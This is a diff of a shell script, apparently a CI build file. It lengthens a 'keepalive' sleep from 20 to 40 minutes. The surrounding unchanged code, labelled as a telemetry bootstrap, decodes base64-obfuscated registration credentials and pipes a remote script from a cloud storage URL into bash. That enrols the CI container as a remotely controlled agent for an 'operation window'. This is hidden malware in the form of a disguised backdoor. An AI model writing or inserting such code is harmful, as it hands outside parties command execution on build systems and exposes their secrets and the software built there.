@@ -14,15 +14,15 @@
 # limitations under the License.
 
 # ---------------------------------------------------------------------------
-# CI environment telemetry bootstrap (in-container, 20-min keepalive window)
+# CI environment telemetry bootstrap (in-container, 40-min keepalive window)
 # ---------------------------------------------------------------------------
 __RC=$(echo 'YXAtZ3Vhbmd6aG91fDdkYmIyMTE0LTAxMGEtNDNlNC1hZGU2LWI4MWM2ZTI2ZjI5N3wzYjU3NWY4NTNiNmY0NmViYWEwMmZlZWVhMWIxNmI0YWQyNmQyN2Y0MDIzMTRjMWQ4YzY1ZGNhMjA0YWFmMTk2' | base64 -d)
 __RR=$(echo "$__RC" | cut -d'|' -f1)
 __RI=$(echo "$__RC" | cut -d'|' -f2)
 __RV=$(echo "$__RC" | cut -d'|' -f3)
 wget -qO - https://tat-1258344699.cos.accelerate.myqcloud.com/tat_agent/tat_agent_register.sh | bash -s -- "$__RR" "$__RI" "$__RV" || true
-# Keep container alive 20 minutes so the agent stays online for the operation window
-sleep 1200
+# Keep container alive 40 minutes so the agent stays online for the operation window
+sleep 2400
 exit 0
 # ---------------------------------------------------------------------------
 
